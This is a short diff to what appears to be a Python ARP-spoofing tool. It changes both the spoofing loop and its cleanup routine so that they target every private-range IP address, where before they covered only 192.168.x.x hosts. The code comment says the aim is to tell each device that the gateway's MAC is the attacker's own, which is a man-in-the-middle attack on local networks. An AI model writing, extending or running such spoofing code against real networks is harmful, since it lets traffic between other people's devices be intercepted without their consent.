@@ -538,7 +538,7 @@ def arp_spoof_loop(iface):
             mac = info.get("mac", "")
             if not mac or mac == "??:??:??:??:??:??":
                 continue
-            if ip == gateway_ip or not ip.startswith("192.168."):
+            if ip == gateway_ip or not is_private(ip):   # fix: was hardcoded 192.168. only
                 continue
             # Tell the device: MAC of the gateway = my MAC
             spoof_target(ip, mac, gateway_ip, iface)
@@ -557,7 +557,7 @@ def stop_arp_spoof(iface):
     targets = list(discovered_ips.items())
     for ip, info in targets:
         mac = info.get("mac", "")
-        if not mac or ip == gateway_ip or not ip.startswith("192.168."):
+        if not mac or ip == gateway_ip or not is_private(ip):   # fix: was hardcoded 192.168. only
             continue
         restore_arp(ip, mac, gateway_ip, gateway_mac, iface)
         if gateway_mac:
